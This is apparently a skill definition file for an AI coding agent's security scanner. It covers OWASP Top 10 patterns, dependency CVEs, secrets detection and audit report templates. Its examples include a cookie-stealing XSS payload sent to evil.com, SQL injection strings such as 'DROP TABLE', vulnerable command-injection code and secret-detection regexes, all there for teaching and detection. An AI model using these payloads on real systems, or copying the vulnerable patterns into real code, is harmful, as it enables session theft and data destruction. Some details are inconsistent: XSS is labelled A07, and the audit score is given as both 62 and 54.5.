---
name: security-scanner
description: Automated security validation for OWASP Top 10, CVE detection, and secrets scanning with confidence-scored vulnerability reports.
allowed-tools: Read, Grep, Bash
---

# Security Scanner Skill

**Purpose:** Prevent the 3x security incidents problem in AI-generated code by providing automated security validation at every development phase.

**When to use:**
- User asks to "check security", "scan for vulnerabilities", "audit this code"
- Before committing code (integration with Coder agent)
- During code review phase
- When adding new dependencies
- When handling user input, authentication, or data storage

**Confidence-based responses:** Each finding includes 0.0-1.0 confidence score with severity rating.

---

## The Security Problem in AI Code

### Current State

**AI-assisted development creates security risks:**
- 3x increase in security incidents correlates with 3x increase in code written
- AI models trained on public code inherit vulnerabilities
- Speed of generation outpaces security review
- "Vibe coding" skips security considerations

**Common AI-generated vulnerabilities:**
1. SQL Injection (string interpolation in queries)
2. XSS (unescaped user input in HTML)
3. Hardcoded secrets (API keys, passwords in code)
4. Insecure authentication (weak token generation)
5. Missing input validation

**This skill solves:** Automated detection before vulnerabilities reach production

---

## Operation 1: OWASP Top 10 Scan

**User Queries:**
- "Scan this file for security issues"
- "Check for SQL injection vulnerabilities"
- "Is this code secure?"
- "Audit the authentication code"

### Confidence Scoring

- **Critical (0.90-1.0):** Definite vulnerability with clear exploit path
- **High (0.75-0.89):** Likely vulnerability, needs immediate review
- **Medium (0.50-0.74):** Potential issue, context-dependent
- **Low (0.25-0.49):** Possible concern, likely false positive
- **Info (0.0-0.24):** Best practice suggestion, not a vulnerability

### Analysis Steps

1. **Identify code patterns:**
   - SQL queries with string interpolation
   - HTML output without encoding
   - User input passed directly to sensitive operations
   - Authentication/authorization logic

2. **Check against OWASP Top 10 2021:**
   - A01: Broken Access Control
   - A02: Cryptographic Failures
   - A03: Injection
   - A04: Insecure Design
   - A05: Security Misconfiguration
   - A06: Vulnerable Components
   - A07: Authentication Failures
   - A08: Data Integrity Failures
   - A09: Logging Failures
   - A10: Server-Side Request Forgery

3. **Calculate confidence:**
   - Pattern match strength
   - Context analysis
   - False positive likelihood

### Vulnerability Patterns

#### A03: Injection (SQL, NoSQL, Command)

**SQL Injection - High Confidence (0.95)**

Pattern: String interpolation in SQL queries

```javascript
// VULNERABLE (Confidence: 0.95)
const userId = req.params.id;
db.query(`SELECT * FROM users WHERE id = ${userId}`);

// VULNERABLE (Confidence: 0.92)
const search = req.query.search;
db.query("SELECT * FROM products WHERE name LIKE '%" + search + "%'");

// SAFE
db.query('SELECT * FROM users WHERE id = ?', [userId]);
db.query('SELECT * FROM users WHERE id = $1', [userId]);
```

**Command Injection - High Confidence (0.90)**

Pattern: User input in shell commands

```javascript
// VULNERABLE (Confidence: 0.90)
const filename = req.params.file;
exec(`cat ${filename}`);

// VULNERABLE (Confidence: 0.88)
const cmd = req.body.command;
child_process.exec(cmd);

// SAFE
const safeFilename = path.basename(filename);
exec(`cat ${shellescape([safeFilename])}`);
```

**NoSQL Injection - Medium Confidence (0.75)**

Pattern: Unsanitized input in MongoDB queries

```javascript
// VULNERABLE (Confidence: 0.75)
const username = req.body.username;
db.users.find({ username: username });  // Could be { $gt: "" }

// SAFE
const username = String(req.body.username);
db.users.find({ username: { $eq: username } });
```

#### A07: Cross-Site Scripting (XSS)

**Reflected XSS - High Confidence (0.92)**

Pattern: User input rendered in HTML without encoding

```javascript
// VULNERABLE (Confidence: 0.92)
res.send(`<h1>Hello ${req.query.name}</h1>`);

// VULNERABLE (Confidence: 0.88)
element.innerHTML = userInput;

// SAFE
res.send(`<h1>Hello ${escapeHtml(req.query.name)}</h1>`);
element.textContent = userInput;
```

**Stored XSS - Critical Confidence (0.95)**

Pattern: Database content rendered without sanitization

```javascript
// VULNERABLE (Confidence: 0.95)
const comment = await db.getComment(id);
res.send(`<div class="comment">${comment.text}</div>`);

// SAFE
const comment = await db.getComment(id);
res.send(`<div class="comment">${DOMPurify.sanitize(comment.text)}</div>`);
```

#### A01: Broken Access Control

**Missing Authorization Check - High Confidence (0.85)**

Pattern: Sensitive operations without permission validation

```javascript
// VULNERABLE (Confidence: 0.85)
app.delete('/api/users/:id', async (req, res) => {
  await db.users.delete(req.params.id);  // No auth check!
  res.json({ success: true });
});

// SAFE
app.delete('/api/users/:id', authorize('admin'), async (req, res) => {
  if (req.user.id !== req.params.id && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  await db.users.delete(req.params.id);
  res.json({ success: true });
});
```

**Insecure Direct Object Reference (IDOR) - Medium Confidence (0.70)**

Pattern: User-controlled IDs without ownership validation

```javascript
// VULNERABLE (Confidence: 0.70)
app.get('/api/orders/:orderId', async (req, res) => {
  const order = await db.orders.findById(req.params.orderId);
  res.json(order);  // Any user can access any order!
});

// SAFE
app.get('/api/orders/:orderId', async (req, res) => {
  const order = await db.orders.findById(req.params.orderId);
  if (order.userId !== req.user.id) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  res.json(order);
});
```

#### A02: Cryptographic Failures

**Weak Password Hashing - Critical Confidence (0.98)**

Pattern: Plain text or weak hashing for passwords

```javascript
// VULNERABLE (Confidence: 0.98)
const passwordHash = md5(password);
const passwordHash = sha1(password);

// VULNERABLE (Confidence: 0.95)
const passwordHash = crypto.createHash('sha256').update(password).digest('hex');

// SAFE
const passwordHash = await bcrypt.hash(password, 12);
const passwordHash = await argon2.hash(password);
```

**Insecure Random Generation - High Confidence (0.88)**

Pattern: Math.random() for security-sensitive operations

```javascript
// VULNERABLE (Confidence: 0.88)
const token = Math.random().toString(36).substr(2);
const sessionId = Math.random() * 1000000;

// SAFE
const token = crypto.randomBytes(32).toString('hex');
const sessionId = crypto.randomUUID();
```

### Response Template

```markdown
## Security Scan Results

**File:** src/api/users.ts
**Scan Date:** 2025-12-15
**Overall Risk:** Critical (1 critical, 2 high, 1 medium)

---

### Critical Findings

#### 1. SQL Injection (A03: Injection)
**Confidence:** 0.95 (Critical)
**Line:** 42
**Severity:** Critical

**Issue:** Direct string interpolation in SQL query allows attackers to execute arbitrary SQL commands.

**Vulnerable Code:**
```javascript
db.query(`SELECT * FROM users WHERE id = ${userId}`)
```

**Attack Example:**
```
userId = "1; DROP TABLE users; --"
Result: SELECT * FROM users WHERE id = 1; DROP TABLE users; --
```

**Fix:**
```javascript
db.query('SELECT * FROM users WHERE id = ?', [userId])
```

**Impact:**
- Data breach (read all user data)
- Data destruction (delete/modify tables)
- Authentication bypass
- Complete database takeover

**References:**
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89](https://cwe.mitre.org/data/definitions/89.html)

---

### High Findings

#### 2. Cross-Site Scripting (A07: XSS)
**Confidence:** 0.88 (High)
**Line:** 78
**Severity:** High

**Issue:** User input rendered in HTML without encoding.

**Vulnerable Code:**
```javascript
res.send(`<h1>Welcome ${req.query.name}</h1>`)
```

**Attack Example:**
```
name = <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

**Fix:**
```javascript
const escapeHtml = require('escape-html');
res.send(`<h1>Welcome ${escapeHtml(req.query.name)}</h1>`)
```

**Impact:**
- Session hijacking
- Account takeover
- Malware distribution
- Phishing attacks

---

### Summary

| Severity | Count | Action Required |
|----------|-------|-----------------|
| Critical | 1 | Block deployment |
| High | 2 | Fix before merge |
| Medium | 1 | Review and consider |
| Low | 0 | - |
| Info | 0 | - |

**Recommendation:** Do not deploy until critical and high findings are resolved.
```

---

## Operation 2: Dependency CVE Scan

**User Queries:**
- "Check dependencies for vulnerabilities"
- "Are my packages secure?"
- "Scan package.json for CVEs"
- "Audit node_modules"

### Analysis Steps

1. **Read dependency files:**
   - `package.json` / `package-lock.json` (Node.js)
   - `requirements.txt` / `Pipfile.lock` (Python)
   - `go.mod` / `go.sum` (Go)
   - `Gemfile.lock` (Ruby)
   - `pom.xml` / `build.gradle` (Java)

2. **Identify package versions:**
   - Extract package name and version
   - Note any version ranges (potential for vulnerable versions)

3. **Check against known CVEs:**
   - Pattern match known vulnerable versions
   - Check for outdated packages with security updates
   - Identify packages with known exploits

### Common Vulnerable Packages

#### Node.js (npm)

```markdown
**Critical CVEs to check:**

| Package | Vulnerable Versions | CVE | Issue |
|---------|-------------------|-----|-------|
| lodash | < 4.17.21 | CVE-2021-23337 | Prototype pollution |
| axios | < 0.21.1 | CVE-2020-28168 | SSRF |
| minimist | < 1.2.6 | CVE-2021-44906 | Prototype pollution |
| node-fetch | < 2.6.7 | CVE-2022-0235 | Exposure of sensitive info |
| express | < 4.17.3 | CVE-2022-24999 | ReDoS |
| jsonwebtoken | < 9.0.0 | CVE-2022-23529 | JWT secret injection |
```

#### Python (pip)

```markdown
**Critical CVEs to check:**

| Package | Vulnerable Versions | CVE | Issue |
|---------|-------------------|-----|-------|
| django | < 3.2.18 | CVE-2023-23969 | DoS |
| flask | < 2.2.5 | CVE-2023-30861 | Cookie confusion |
| requests | < 2.31.0 | CVE-2023-32681 | Proxy auth leak |
| pillow | < 9.3.0 | CVE-2022-45198 | DoS |
| pyyaml | < 5.4 | CVE-2020-14343 | Arbitrary code execution |
```

### Response Template

```markdown
## Dependency Vulnerability Scan

**Project:** my-ecommerce-app
**Scan Date:** 2025-12-15
**Package Manager:** npm
**Total Dependencies:** 847 (direct: 42, transitive: 805)

---

### Critical Vulnerabilities

#### 1. lodash@4.17.15
**CVE:** CVE-2021-23337
**Severity:** Critical (CVSS: 9.8)
**Confidence:** 0.98

**Issue:** Prototype pollution vulnerability allows attackers to modify Object.prototype.

**Impact:**
- Remote code execution
- Denial of service
- Property injection

**Fix:**
```bash
npm install lodash@4.17.21
```

**Upgrade Path:** 4.17.15 → 4.17.21 (patch version, safe upgrade)

---

#### 2. axios@0.19.2
**CVE:** CVE-2020-28168
**Severity:** High (CVSS: 7.5)
**Confidence:** 0.95

**Issue:** Server-Side Request Forgery (SSRF) when following redirects.

**Impact:**
- Internal network access
- Cloud metadata exposure
- Firewall bypass

**Fix:**
```bash
npm install axios@0.21.1
```

**Upgrade Path:** 0.19.2 → 0.21.1 (minor version, review changelog)

---

### Summary

| Severity | Count | Packages |
|----------|-------|----------|
| Critical | 1 | lodash |
| High | 2 | axios, jsonwebtoken |
| Medium | 3 | express, minimist, node-fetch |
| Low | 5 | - |

**Auto-fix available:**
```bash
npm audit fix
```

**Manual upgrade required for:**
- axios (breaking changes in 1.x)
- jsonwebtoken (API changes in 9.x)

**Recommendation:** Run `npm audit fix` for safe upgrades, then manually review breaking changes.
```

---

## Operation 3: Secrets Detection

**User Queries:**
- "Check for hardcoded secrets"
- "Find API keys in code"
- "Scan for exposed credentials"
- "Are there any passwords in the repo?"

### Pattern Detection

#### API Keys and Tokens

```markdown
**High Confidence Patterns:**

| Type | Pattern | Example | Confidence |
|------|---------|---------|------------|
| AWS Access Key | AKIA[0-9A-Z]{16} | AKIAIOSFODNN7EXAMPLE | 0.95 |
| AWS Secret Key | [A-Za-z0-9/+=]{40} (near 'aws') | wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY | 0.85 |
| GitHub Token | ghp_[a-zA-Z0-9]{36} | ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx | 0.98 |
| Stripe Key | sk_live_[a-zA-Z0-9]{24} | sk_test_EXAMPLE_KEY_REPLACE | 0.98 |
| Slack Token | xox[baprs]-[0-9]{10,}-[a-zA-Z0-9]{10,} | xoxb-123456789-AbCdEf | 0.95 |
| Google API Key | AIza[0-9A-Za-z-_]{35} | AIzaSyDaGmWKa4JsXZ-HjGw7ISLn_3namBGewQe | 0.92 |
| JWT Secret | (jwt|JWT|secret|SECRET).*['\"][a-zA-Z0-9]{20,}['\"] | JWT_SECRET = "abc123..." | 0.88 |
| Database URL | (postgres|mysql|mongodb):\/\/[^:]+:[^@]+@ | postgres://user:pass@host | 0.95 |
```

#### Password Patterns

```markdown
**Medium Confidence Patterns:**

| Type | Pattern | Example | Confidence |
|------|---------|---------|------------|
| Hardcoded password | password\s*[=:]\s*['"][^'"]{6,}['"] | password = "admin123" | 0.75 |
| Connection string | (password|pwd)\s*[=:]\s*[^;\s]+ | password=secret123 | 0.80 |
| Private key | -----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY----- | RSA key block | 0.98 |
```

### Analysis Steps

1. **Scan file content:**
   - Search for pattern matches
   - Check variable names and context
   - Identify assignment patterns

2. **Check file types:**
   - `.env` files (should be in .gitignore)
   - Config files (often contain secrets)
   - Test files (sometimes have real credentials)
   - Documentation (accidentally included)

3. **Verify .gitignore:**
   - Check if `.env` is ignored
   - Check if secrets directories are ignored
   - Identify committed files that should be ignored

4. **Assess false positives:**
   - Example values (EXAMPLE, xxx, placeholder)
   - Documentation snippets
   - Test fixtures with dummy data

### Response Template

```markdown
## Secrets Detection Scan

**Repository:** my-ecommerce-app
**Scan Date:** 2025-12-15
**Files Scanned:** 234
**Secrets Found:** 3 confirmed, 2 potential

---

### Confirmed Secrets

#### 1. AWS Access Key
**File:** src/config/aws.js:12
**Confidence:** 0.95 (Confirmed)
**Type:** AWS Access Key ID

**Found:**
```javascript
const AWS_ACCESS_KEY = 'AKIAIOSFODNN7EXAMPLE';
```

**Risk:** AWS account compromise
- EC2 instances could be launched (crypto mining)
- S3 buckets could be accessed/deleted
- IAM could be modified

**Remediation:**
1. Immediately rotate this key in AWS Console
2. Move to environment variable:
   ```javascript
   const AWS_ACCESS_KEY = process.env.AWS_ACCESS_KEY_ID;
   ```
3. Add to .env (ensure .env is in .gitignore):
   ```
   AWS_ACCESS_KEY_ID=your_new_key
   ```

**Git History Warning:** This secret is in git history. Consider:
- Using `git filter-branch` or BFG Repo-Cleaner
- Rotating the credential regardless

---

#### 2. Database Connection String
**File:** src/db/connection.ts:5
**Confidence:** 0.92 (Confirmed)
**Type:** PostgreSQL credentials

**Found:**
```typescript
const connectionString = 'postgres://admin:SuperSecret123@db.example.com:5432/production';
```

**Risk:** Database compromise
- Full read/write access to production data
- Data exfiltration
- Data destruction

**Remediation:**
1. Change database password immediately
2. Use environment variable:
   ```typescript
   const connectionString = process.env.DATABASE_URL;
   ```

---

### Potential Secrets (Review Required)

#### 3. Possible API Key
**File:** tests/fixtures/api.test.js:8
**Confidence:** 0.45 (Low - likely test fixture)
**Type:** Generic API key pattern

**Found:**
```javascript
const testApiKey = 'sk_test_abcdef123456';
```

**Assessment:** Likely a test/mock value (contains 'test'). Verify this is not a real credential.

---

### .gitignore Analysis

**Status:** Needs improvement

**Missing entries:**
- `.env.local` (found in repository)
- `config/secrets.json` (found in repository)

**Recommended additions to .gitignore:**
```
.env
.env.*
config/secrets.json
*.pem
*.key
```

---

### Summary

| Status | Count | Action |
|--------|-------|--------|
| Confirmed | 3 | Rotate immediately |
| Potential | 2 | Review and verify |
| In .gitignore | 1 | Already protected |

**Immediate Actions:**
1. Rotate AWS credentials
2. Change database password
3. Update .gitignore
4. Consider git history cleanup
```

---

## Operation 4: Full Security Audit

**User Queries:**
- "Run a full security audit"
- "Security review this project"
- "Check everything for vulnerabilities"

### Comprehensive Audit Steps

1. **OWASP Top 10 Scan** (Operation 1)
   - All source files
   - Focus on input handling, auth, data access

2. **Dependency CVE Scan** (Operation 2)
   - All package managers detected
   - Direct and transitive dependencies

3. **Secrets Detection** (Operation 3)
   - All files including config
   - Git history check

4. **Security Configuration Review:**
   - HTTPS enforcement
   - CORS settings
   - CSP headers
   - Cookie security flags
   - Rate limiting

5. **Authentication Review:**
   - Password policy
   - Session management
   - Token handling
   - MFA implementation

### Response Template

```markdown
## Full Security Audit Report

**Project:** my-ecommerce-app
**Audit Date:** 2025-12-15
**Auditor:** Security Scanner Skill v3.7.0
**Overall Score:** 62/100 (Needs Improvement)

---

### Executive Summary

This audit identified **15 security issues** across 4 categories:

| Category | Critical | High | Medium | Low |
|----------|----------|------|--------|-----|
| Code Vulnerabilities | 1 | 2 | 3 | 2 |
| Dependencies | 1 | 2 | 1 | 0 |
| Secrets | 2 | 1 | 0 | 0 |
| Configuration | 0 | 1 | 1 | 0 |
| **Total** | **4** | **6** | **5** | **2** |

**Risk Assessment:** The project has critical vulnerabilities that could lead to:
- Data breach (SQL injection, exposed credentials)
- Account takeover (XSS, session issues)
- Service disruption (vulnerable dependencies)

**Recommendation:** Address all critical and high issues before deployment.

---

### Detailed Findings

#### A. Code Vulnerabilities (8 issues)

[... detailed OWASP findings ...]

#### B. Dependency Vulnerabilities (4 issues)

[... detailed CVE findings ...]

#### C. Secrets Exposure (3 issues)

[... detailed secrets findings ...]

#### D. Configuration Issues (2 issues)

##### D1. Missing Security Headers
**Severity:** High
**Confidence:** 0.85

**Issue:** Application does not set security headers.

**Missing Headers:**
- Content-Security-Policy
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security

**Fix (Express.js):**
```javascript
const helmet = require('helmet');
app.use(helmet());
```

##### D2. Insecure Cookie Configuration
**Severity:** Medium
**Confidence:** 0.80

**Issue:** Session cookies missing security flags.

**Current:**
```javascript
res.cookie('session', token);
```

**Fix:**
```javascript
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});
```

---

### Remediation Priority

**Week 1 (Critical):**
1. Fix SQL injection vulnerability
2. Rotate exposed AWS credentials
3. Change database password
4. Update lodash to 4.17.21

**Week 2 (High):**
1. Fix XSS vulnerabilities (2)
2. Add security headers (helmet)
3. Update axios, jsonwebtoken
4. Secure cookie configuration

**Week 3 (Medium):**
1. Fix IDOR vulnerability
2. Update .gitignore
3. Review remaining dependencies
4. Implement rate limiting

---

### Security Score Breakdown

| Category | Score | Weight | Weighted |
|----------|-------|--------|----------|
| Injection Prevention | 40/100 | 25% | 10 |
| Authentication | 70/100 | 20% | 14 |
| Data Protection | 50/100 | 20% | 10 |
| Dependencies | 60/100 | 15% | 9 |
| Configuration | 65/100 | 10% | 6.5 |
| Secrets Management | 50/100 | 10% | 5 |
| **Total** | - | 100% | **54.5/100** |

---

### Compliance Notes

**OWASP ASVS Level 1:** 12/14 requirements met (after fixes)
**PCI DSS:** Not compliant (SQL injection, credential exposure)
**GDPR:** Risk of data breach (address critical issues)

---

### Next Audit Recommendation

Schedule follow-up audit in 30 days after remediation.
Focus areas:
- Verify all critical fixes implemented
- Re-scan dependencies after updates
- Confirm credential rotation
```

---

## Edge Cases & Troubleshooting

### Edge Case 1: False Positives

**Scenario:** Scan reports vulnerability in test/mock code

**Detection:**
- File path contains `test`, `spec`, `mock`, `fixture`
- Variable name contains `example`, `test`, `mock`, `fake`
- Value contains placeholder patterns (`xxx`, `EXAMPLE`, `placeholder`)

**Response:**
```markdown
**Potential False Positive**
**Confidence adjusted:** 0.95 → 0.35

**Reason:** Found in test file with mock data pattern.

**Original finding:**
- File: tests/auth.test.js
- Line: `const apiKey = 'sk_test_123abc';`

**Assessment:** Likely intentional test fixture. Verify this is not a real credential by checking if:
1. It works against production API
2. Similar pattern exists in non-test files
```

### Edge Case 2: Minified/Bundled Code

**Scenario:** Scanning production bundle with minified code

**Detection:**
- File ends with `.min.js`, `.bundle.js`
- Single line > 1000 characters
- Variable names are single letters

**Response:**
```markdown
**Limited Scan Accuracy**

**Issue:** File appears to be minified/bundled.

**File:** dist/app.bundle.js
**Confidence modifier:** -30% on all findings

**Recommendation:**
1. Scan source files instead of bundles
2. If bundle must be scanned, use source maps
3. Consider pre-bundle security checks in CI/CD
```

### Edge Case 3: Framework-Specific Patterns

**Scenario:** Framework provides built-in protection

**Examples:**
- React: JSX auto-escapes by default (XSS protection)
- Django: ORM prevents SQL injection
- Rails: CSRF protection by default

**Response:**
```markdown
**Framework Protection Detected**

**Finding:** Potential XSS in JSX
**Original Confidence:** 0.85
**Adjusted Confidence:** 0.25

**Reason:** React JSX auto-escapes expressions.

**Code:**
```jsx
<div>{userInput}</div>  // Safe - React escapes this
```

**Still vulnerable if:**
```jsx
<div dangerouslySetInnerHTML={{__html: userInput}} />  // Bypass!
```

**Scan adjusted:** Only flagging explicit escape bypasses.
```

### Edge Case 4: Environment-Specific Code

**Scenario:** Code behaves differently in development vs production

**Detection:**
- `process.env.NODE_ENV` checks
- Development-only logging
- Debug mode configurations

**Response:**
```markdown
**Environment-Conditional Vulnerability**

**Finding:** Sensitive data logging
**File:** src/api/auth.js:45
**Confidence:** 0.70 (conditional)

**Code:**
```javascript
if (process.env.NODE_ENV === 'development') {
  console.log('Login attempt:', { email, password });  // Logs password!
}
```

**Risk:** Lower in production (code doesn't execute), but:
1. Could leak to development logs
2. Someone might accidentally set NODE_ENV=development in production
3. Log aggregators might capture

**Recommendation:** Never log sensitive data, even in development:
```javascript
console.log('Login attempt:', { email, passwordLength: password?.length });
```
```

---

## Integration with Other Skills

### Integration with Coder Agent

**When Coder Agent completes a feature:**

```markdown
Coder Agent: "Feature feat-007 (Shopping Cart) complete. Running quality checks..."

Security Scanner activated:
- Scanning: src/cart/*.js (5 files)
- Scanning: src/api/cart.js (1 file)

Results:
- No critical vulnerabilities
- 1 medium finding (input validation)
- Recommendation: Add input sanitization to quantity field

Coder Agent: "Security scan complete. 1 medium issue found. Would you like to:
1. Fix now (add input validation)
2. Continue and note in progress.md
3. Review the finding first"
```

### Integration with Test Generator

**After test generation:**

```markdown
Test Generator: "Generated 6 tests for feat-007"

Security Scanner: "Checking generated tests for security test coverage..."

Results:
- Missing: SQL injection test
- Missing: XSS test for user input display
- Present: Authentication test

Suggestion: Add security-focused tests:
```javascript
test('prevents SQL injection in search', async () => {
  const maliciousInput = "'; DROP TABLE products; --";
  const result = await searchProducts(maliciousInput);
  expect(db.query).toHaveBeenCalledWith(
    expect.stringContaining('?'),  // Parameterized
    expect.arrayContaining([maliciousInput])
  );
});
```
```

### Integration with Standards Enforcer

**Security as a coding standard:**

```markdown
Standards Enforcer: "Applying team security standards..."

Team Security Rules (from coding-standards.md):
1. All SQL queries must use parameterized statements
2. User input must be sanitized before display
3. Authentication required for all /api/* routes
4. No hardcoded credentials (use env vars)

Security Scanner: "Cross-referencing with security standards..."

Violations found:
- Rule 1: Violated in src/api/search.js:42
- Rule 3: Violated in src/api/health.js (missing auth)

Confidence boosted: Team explicitly requires these patterns.
Findings upgraded: Medium → High (per team standards)
```

---

## Skill Metadata

**Token Efficiency:**
- Full code scan: ~800 tokens (vs ~3,000 manual review)
- Dependency scan: ~400 tokens (vs ~1,500 manual)
- Secrets scan: ~300 tokens (vs ~1,000 manual)
- Full audit: ~2,000 tokens (vs ~8,000 manual)
- **Average savings: 70-75%**

**Use Cases:**
1. **Pre-commit check:** Quick scan before committing code
2. **PR review:** Automated security review in pull requests
3. **Dependency updates:** Check new packages for CVEs
4. **Periodic audit:** Scheduled security reviews
5. **Incident response:** Rapid vulnerability assessment

**Complementary Skills:**
- **Test Generator:** Create security test cases
- **Standards Enforcer:** Apply security coding standards
- **Quality Orchestrator:** Coordinate with other quality gates

**Confidence Philosophy:**
- **0.90-1.0:** Definite vulnerability, immediate action required
- **0.75-0.89:** High likelihood, investigate and fix
- **0.50-0.74:** Possible issue, context-dependent review
- **0.25-0.49:** Low likelihood, likely false positive
- **0.0-0.24:** Informational, best practice suggestion

---

## Quick Reference

### Common Commands

**Scan specific file:**
```
"Scan src/api/users.ts for security issues"
```

**Check dependencies:**
```
"Check my npm packages for vulnerabilities"
```

**Find secrets:**
```
"Search for hardcoded credentials in the codebase"
```

**Full audit:**
```
"Run a complete security audit"
```

### Severity Quick Guide

| Severity | Action | Timeline |
|----------|--------|----------|
| Critical | Block deployment | Immediate |
| High | Fix before merge | Same day |
| Medium | Fix soon | This sprint |
| Low | Consider fixing | Backlog |
| Info | Optional | When convenient |

### OWASP Top 10 Quick Reference

| ID | Name | Common Pattern |
|----|------|----------------|
| A01 | Broken Access Control | Missing auth checks |
| A02 | Cryptographic Failures | Weak hashing, exposed data |
| A03 | Injection | SQL, command, NoSQL |
| A07 | XSS | Unescaped user input |
| A05 | Security Misconfiguration | Missing headers, defaults |

---

**Remember:** This skill provides **automated detection** but not replacement for security expertise. For critical applications, complement with professional security audits and penetration testing.
